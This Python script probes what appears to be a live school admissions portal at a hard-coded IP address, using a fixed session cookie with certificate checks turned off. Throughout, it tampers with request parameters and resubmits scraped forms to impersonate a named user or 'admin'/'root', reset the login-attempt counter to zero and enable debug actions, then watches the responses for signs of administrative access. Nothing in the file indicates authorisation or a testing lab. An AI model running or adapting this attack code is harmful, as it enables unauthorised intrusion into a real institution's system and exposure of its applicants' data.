# parameter_analysis.py
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ParameterAnalysis:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.set('JSESSIONID', '3B0DDD39CD0068BB30ED28B8C75B2A38')
        
    def analyze_parameter_behavior(self):
        """Analiza el comportamiento de los parámetros que SÍ funcionan"""
        print("=== ANÁLISIS DE PARÁMETROS FUNCIONALES ===")
        
        base_url = f"{self.base_url}/jsp/escolar/proceso_admision/proceso_interesado.jsp"
        
        # Parámetros que mostraron comportamiento diferente
        interesting_params = {
            "xModalidadP": ["N", "D", "Z", "X", "admin", "1"],
            "yAccion": ["debug", "test", "admin", "config"],
            "yUsuario": ["hnieto", "admin", "root"],
            "yIntentos": ["0", "999", "admin"]
        }
        
        for param, values in interesting_params.items():
            print(f"\n[+] Analizando parámetro: {param}")
            
            for value in values:
                url = f"{base_url}?{param}={value}"
                response = self.session.get(url)
                
                print(f"  {param}={value}: Status {response.status_code}, Tamaño {len(response.text)}")
                
                # Buscar diferencias específicas
                self.find_differences(response.text, f"{param}_{value}")
    
    def find_differences(self, content, test_name):
        """Encuentra diferencias en el contenido"""
        # Buscar elementos específicos que indiquen funcionalidades
        indicators = {
            "formularios": len(re.findall(r'<form', content)),
            "inputs_ocultos": len(re.findall(r'type=["\']hidden["\']', content)),
            "botones": len(re.findall(r'<input[^>]*type=["\']submit["\']', content)),
            "javascript": len(re.findall(r'<script', content)),
            "tablas": len(re.findall(r'<table', content)),
            "enlaces": len(re.findall(r'<a [^>]*href=', content)),
        }
        
        # Mostrar solo si hay diferencias interesantes
        if indicators["formularios"] > 1 or indicators["inputs_ocultos"] > 10:
            print(f"    🔍 {test_name}: {indicators}")
    
    def test_form_submission(self):
        """Prueba envío de formularios con parámetros manipulados"""
        print("\n[+] Probando envío de formularios...")
        
        form_url = f"{self.base_url}/jsp/escolar/proceso_admision/proceso_interesado.jsp"
        
        # Primero obtener el formulario
        response = self.session.get(form_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        print(f"Formularios encontrados: {len(forms)}")
        
        for i, form in enumerate(forms):
            print(f"\n--- Formulario {i+1} ---")
            
            # Extraer todos los inputs
            inputs = form.find_all('input')
            form_data = {}
            
            for input_tag in inputs:
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                input_type = input_tag.get('type', 'text')
                
                if name:
                    form_data[name] = value
                    print(f"  Input: {name} = {value} ({input_type})")
            
            # Probar envío del formulario con datos manipulados
            if form_data:
                # Manipular datos interesantes
                if 'yAccion' in form_data:
                    form_data['yAccion'] = 'debug'
                if 'yUsuario' in form_data:
                    form_data['yUsuario'] = 'hnieto'
                if 'yIntentos' in form_data:
                    form_data['yIntentos'] = '0'
                
                # Agregar campos de prueba
                form_data['xTest'] = 'test_value'
                form_data['debug'] = 'true'
                
                try:
                    # Determinar método y acción
                    method = form.get('method', 'get').lower()
                    action = form.get('action', '')
                    
                    if action and not action.startswith('http'):
                        action = self.base_url + action
                    else:
                        action = form_url
                    
                    print(f"  Enviando a: {action} ({method})")
                    
                    if method == 'post':
                        response = self.session.post(action, data=form_data)
                    else:
                        response = self.session.get(action, params=form_data)
                    
                    print(f"  Respuesta: Status {response.status_code}, Tamaño {len(response.text)}")
                    
                    # Buscar mensajes de error o éxito
                    if "error" in response.text.lower():
                        print("  ⚠️  Mensaje de error detectado")
                    if "éxito" in response.text.lower() or "exito" in response.text.lower():
                        print("  ✅ Mensaje de éxito detectado")
                    if "admin" in response.text.lower():
                        print("  🔍 Referencia a administración detectada")
                        
                except Exception as e:
                    print(f"  ❌ Error: {e}")

# Ejecutar
if __name__ == "__main__":
    analyzer = ParameterAnalysis()
    analyzer.analyze_parameter_behavior()
    analyzer.test_form_submission()